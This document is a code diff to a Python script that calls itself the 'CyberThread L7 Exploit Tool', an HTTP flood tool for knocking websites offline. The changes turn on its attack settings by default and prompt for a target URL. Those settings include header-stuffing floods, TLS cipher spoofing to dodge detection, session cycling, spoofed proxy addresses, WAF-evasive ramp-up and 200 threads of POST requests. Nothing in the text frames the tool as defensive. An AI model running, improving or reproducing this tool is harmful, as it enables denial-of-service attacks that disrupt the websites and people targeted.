@@ -10,7 +10,6 @@ import sys
 import traceback
 import os
 import base64
-import argparse
 import shutil
 from datetime import datetime
 import string
@@ -24,7 +23,7 @@ ANSI_RESET = "\033[0m"
 
 # Global variables
 target = ""
-threads = 0
+threads = 200
 payload_type = ""
 ua_file = ""
 bypass_header = False
@@ -45,16 +44,6 @@ proxies = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,2
 max_retries = 5  # Default threshold untuk failover
 
 thread_local = threading.local()
-
-def parse_args():
-    parser = argparse.ArgumentParser(description="CyberThread L7 Exploit Tool")
-    parser.add_argument("--target", type=str, help="Target URL (e.g., http://example.com)")
-    parser.add_argument("--fire", action="store_true", help="Run in brutal mode")
-    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
-    parser.add_argument("--silent", action="store_true", help="Silent mode (no output)")
-    parser.add_argument("--dashboard", action="store_true", help="Live dashboard mode")
-    parser.add_argument("--stealth-force", action="store_true", help="Brutal stealth mode (no VPN, no proxy)")
-    return parser.parse_args()
 
 def load_list(file):
     if not os.path.exists(file):
@@ -101,6 +90,10 @@ def inject_headers():
                 f"X-Brute-{i}": ''.join(random.choices("0123456789ABCDEF", k=32))
                 for i in range(random.randint(50, 150))
             })
+
+    if payload_type == "multipart":
+        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
+        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
 
     return headers
 
@@ -232,12 +225,11 @@ def rotate_tls_context():
             "ECDHE-ECDSA-AES256-GCM-SHA384",
             "TLS_AES_256_GCM_SHA384"
         ]
-        for cipher in ciphers:
-            try:
-                thread_local.tls_ctx.set_ciphers(cipher)
-                return thread_local.tls_ctx
-            except ssl.SSLError as e:
-                print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
+        cipher = random.choice(ciphers)
+        try:
+            thread_local.tls_ctx.set_ciphers(cipher)
+        except ssl.SSLError as e:
+            print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
     if thread_local.tls_ctx is None:
         thread_local.tls_ctx = ssl.create_default_context()
     return thread_local.tls_ctx
@@ -394,9 +386,9 @@ def launch_ghost_sequence():
         thread_pool.append(thread)
         time.sleep(random.uniform(0.01, 0.03))  # WAF evasive ramp-up
 
-    if args.dashboard and not args.silent:
+    if not silent_mode:
         threading.Thread(target=render_dashboard).start()
-    elif args.silent:
+    else:
         threading.Thread(target=print_status).start()
 
     if failover_monitoring:
@@ -419,6 +411,7 @@ def print_status():
         time.sleep(1)
 
 def render_dashboard():
+    global args
     while not stop_event.is_set():
         columns = shutil.get_terminal_size().columns
         now = datetime.now().strftime("%H:%M:%S")
@@ -453,63 +446,35 @@ def print_banner_brutal():
     """)
 
 if __name__ == "__main__":
-    args = parse_args()
+    global target
+    target = input("Enter the target URL: ") or "https://targetlo.com"
+    threads = int(input("Enter the number of threads (default 200): ") or 200)
 
-    if args.target:
-        try:
-            parsed_url = urlparse(args.target)
-            if not parsed_url.scheme or not parsed_url.hostname:
-                raise ValueError("Invalid URL")
-        except Exception:
-            print(f"{ANSI_RED}[ERROR] Invalid target URL: {args.target}{ANSI_RESET}")
-            sys.exit(1)
-    elif args.fire or args.stealth_force:
-        target = "https://targetlo.com"  # Ganti dengan target real
-        try:
-            parsed_url = urlparse(target)
-            if not parsed_url.scheme or not parsed_url.hostname:
-                raise ValueError("Invalid URL")
-        except Exception:
-            print(f"{ANSI_RED}[ERROR] Invalid target URL: {target}{ANSI_RESET}")
-            sys.exit(1)
-    else:
-        print(f"{ANSI_RED}[ERROR] --target required unless --fire or --stealth-force with fallback{ANSI_RESET}")
-        print("Example usage: python script.py --target https://example.com --threads 200 --fire")
-        exit()
+    try:
+        parsed_url = urlparse(target)
+        if not parsed_url.scheme or not parsed_url.hostname:
+            raise ValueError("Invalid URL")
+    except Exception:
+        print(f"{ANSI_RED}[ERROR] Invalid target URL: {target}{ANSI_RESET}")
+        sys.exit(1)
 
     if not log_file_path:
         log_file_path = f"/sdcard/cyberthread_log_{int(time.time())}.txt"
 
     print_banner_brutal()
 
-    if args.silent:
-        silent_mode = True
-        if not log_file_path:
-            log_file_path = f"/sdcard/cyberthread_silentlog_{int(time.time())}.txt"
-        log_file = open(log_file_path, 'a')
+    silent_mode = False
+    ua_file = os.path.expanduser("~/ua_fallback.txt")
+    if not os.path.exists(ua_file):
+        ua_file = "/data/data/com.termux/files/home/ua_fallback.txt"
 
-    if args.fire:
-        bypass_header = True
-        tls_spoofing = True
-        session_cycle = True
-        failover_monitoring = True
-        delay = 0.1
-        payload_type = "ghost-mutation"
-        threads = args.threads
-        flood_method = "POST"
-        ua_file = os.path.expanduser("~/ua_fallback.txt")
-
-    if args.stealth_force:
-        bypass_header = True
-        tls_spoofing = True
-        session_cycle = True
-        failover_monitoring = True
-        payload_type = "ghost-mutation"
-        threads = args.threads if args.threads else 300
-        delay = 0.05
-        flood_method = "PATCH"
-        ua_file = os.path.expanduser("~/ua_fallback.txt")
-        threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()
+    bypass_header = True
+    tls_spoofing = True
+    session_cycle = True
+    failover_monitoring = True
+    delay = 0.1
+    payload_type = "ghost-mutation"
+    flood_method = "POST"
 
     try:
         socket.gethostbyname(parsed_url.hostname)
